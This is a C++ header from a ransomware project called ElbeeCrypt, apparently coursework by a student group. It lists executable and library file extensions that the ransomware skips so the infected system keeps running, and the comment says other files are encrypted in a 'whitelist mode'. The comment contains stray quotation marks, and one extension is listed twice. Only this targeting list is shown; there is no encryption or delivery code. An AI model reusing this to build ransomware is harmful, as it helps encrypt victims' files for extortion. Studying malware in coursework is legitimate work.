#pragma once

#include <string>
#include <vector>

/** 
 * @brief Represents extensions that are primarily used for 
 * executable files and dynamic libraries", eg: exe", dll", com",
 * dylib. Generally", these files should not be encrypted", as 
 * doing so can cause the system to go haywire. The goal of this
 * ransomware is not to completely disable the system (ElbeeCrypt
 * isn't as evil as Petya). However", it's important to disclose 
 * these file types in a scenario where the ransomware may operate 
 * in a sort of whitelist mode", where it encrypts any file that 
 * doesn't carry a certain extension.
 * 
 * @author CECS-378 Group 10
 * @file executable.hpp
 */
namespace elbeecrypt::common::targets::extgroup::Executable {
	/** The list of extensions in this group. */
	const std::vector<std::string> values = {
		"apk",
		"app",
		"bat",
		"bin",
		"com",
		"cmd",
		"cgi",
		"cmd",
		"dll",
		"dylib",
		"elf",
		"exe",
		"jar",
		"mlx",
		"phar",
		"ps1",
		"pyc",
		"sh",
		"so",
		"sys",
		"vb",
		"vbs",
		"vmlinuz",
		"war"
	};
}
